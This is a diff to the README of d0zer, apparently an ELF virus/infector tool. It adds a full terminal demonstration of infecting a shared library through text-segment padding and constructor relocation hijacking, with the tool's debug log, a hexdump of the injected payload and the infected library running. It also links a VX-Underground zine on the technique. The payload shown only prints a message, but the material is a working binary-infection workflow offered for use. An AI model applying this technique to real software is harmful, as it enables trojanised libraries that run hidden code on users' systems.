@@ -182,8 +182,83 @@ void foo(void)
     puts("Hello, I am a shared library");
 }
 [sad0p@arch-deliberate testlib2]$ 
+[sad0p@arch-deliberate testlib2]$ ./compile-lib.sh 
+[sad0p@arch-deliberate testlib2]$ ls
+compile-lib.sh  foo.c  foo.h  foo.o  libfoo.so  main.c  test
+[sad0p@arch-deliberate testlib2]$ ./test
+This is a shared library test...
+Hello, I am a shared library
+[sad0p@arch-deliberate testlib2]$ ../../d0zer -target ./libfoo.so -infectionAlgo TextSegmentPadding -ctorsHijack -debug 
+[+] Maximum payload size 0xed3 for ./libfoo.so
+[+] CtorsHijack requested. Locating and reading Dynamic Segment
+[+] 24 entries in Dynamic Segment
+[+] Located DT_RELA @ 0x0000000000000478
+[+] DT_RELA has 24 entries
+[+] File offset of relocations @ 0x0000000000000478
+[+] Found viable relocation record hooking/poisoning
+	offset: 0x0000000000003df8
+	type: R_X86_64_RELATIVE
+	Addend: 0x0000000000001100
+[+] offset 0x0000000000002df8 updated with value (Addend) 000000000000112d
+[+] Text segment starts @ 0x1000
+[+] Text segment ends @ 0x112d
+[+] Payload size pre-epilogue 0x5c
+[+] Appended default restoration stub
+[+] Generated and appended position independent return 2 OEP stub to payload
+[+] Payload size post-epilogue 0x90
+------------------PAYLOAD----------------------------
+00000000  54 50 51 53 52 56 57 55  41 50 41 51 41 52 41 53  |TPQSRVWUAPAQARAS|
+00000010  41 54 41 55 41 56 41 57  eb 00 e8 2b 00 00 00 68  |ATAUAVAW...+...h|
+00000020  65 6c 6c 6f 20 2d 2d 20  74 68 69 73 20 69 73 20  |ello -- this is |
+00000030  61 20 6e 6f 6e 20 64 65  73 74 72 75 63 74 69 76  |a non destructiv|
+00000040  65 20 70 61 79 6c 6f 61  64 0a b8 01 00 00 00 bf  |e payload.......|
+00000050  01 00 00 00 5e ba 2a 00  00 00 0f 05 41 5f 41 5e  |....^.*.....A_A^|
+00000060  41 5d 41 5c 41 5b 41 5a  41 59 41 58 5d 5f 5e 5a  |A]A\A[AZAYAX]_^Z|
+00000070  5b 59 58 5c e8 12 00 00  00 48 83 e8 79 48 2d 2d  |[YX\.....H..yH--|
+00000080  11 00 00 48 05 00 11 00  00 ff e0 48 8b 04 24 c3  |...H.......H..$.|
+--------------------END------------------------------
+[+] Increased text segment p_filesz and p_memsz by 144 (length of payload)
+[+] Adjusting segments after text segment file offsets by 0x1000
+	Inceasing pHeader @ index 2 by 0x1000
+	Inceasing pHeader @ index 3 by 0x1000
+	Inceasing pHeader @ index 4 by 0x1000
+	Inceasing pHeader @ index 8 by 0x1000
+	Inceasing pHeader @ index 10 by 0x1000
+[+] Increasing section header addresses if they come after text segment
+[+] Extending section header entry for text section by payload len.
+[+] (14) Updating sections past text section @ addr 0x2000
+[+] (15) Updating sections past text section @ addr 0x2020
+[+] (16) Updating sections past text section @ addr 0x2040
+[+] (17) Updating sections past text section @ addr 0x3df8
+[+] (18) Updating sections past text section @ addr 0x3e00
+[+] (19) Updating sections past text section @ addr 0x3e08
+[+] (20) Updating sections past text section @ addr 0x3fc8
+[+] (21) Updating sections past text section @ addr 0x3fe8
+[+] (22) Updating sections past text section @ addr 0x4008
+[+] (23) Updating sections past text section @ addr 0x4010
+[+] (24) Updating sections past text section @ addr 0x0
+[+] (25) Updating sections past text section @ addr 0x0
+[+] (26) Updating sections past text section @ addr 0x0
+[+] (27) Updating sections past text section @ addr 0x0
+[+] writing payload into the binary
+[sad0p@arch-deliberate testlib2]$ ls
+compile-lib.sh  foo.c  foo.h  foo.o  libfoo.so  libfoo.so-infected  main.c  test
+[sad0p@arch-deliberate testlib2]$ cp libfoo.so-infected libfoo.so-infected.backup
+[sad0p@arch-deliberate testlib2]$ cp libfoo.so libfoo.so-clean-backup
+[sad0p@arch-deliberate testlib2]$ mv libfoo.so-infected libfoo.so
+[sad0p@arch-deliberate testlib2]$ ./test
+hello -- this is a non destructive payloadThis is a shared library test...
+Hello, I am a shared library
+[sad0p@arch-deliberate testlib2]$ ls
+compile-lib.sh  foo.c  foo.h  foo.o  libfoo.so  libfoo.so-clean-backup  libfoo.so-infected.backup  main.c  test
+[sad0p@arch-deliberate testlib2]$ 
 
 </pre>  
+
+# VX-Underground Black Mass Volume 2
+
+Shared object infection through relocation hijacking / poisoning is well documented in Black Mass Volume 2 [here.] (https://samples.vx-underground.org/root/Papers/Other/VXUG%20Zines/2023-09-19%20-%20Black%20Mass%20Volume%20II.pdf)
+
 # Advance Usage
 
 In the event you don't like the routines d0zer add to your code the following flags can be utilized, however your payload
@@ -214,3 +289,4 @@ https://vx-underground.org/archive/VxHeaven/lib/vsc01.html
 Return To Original Entry Point Despite PIE - by s0lden
 https://tmpout.sh/1/11.html
 </pre>
+
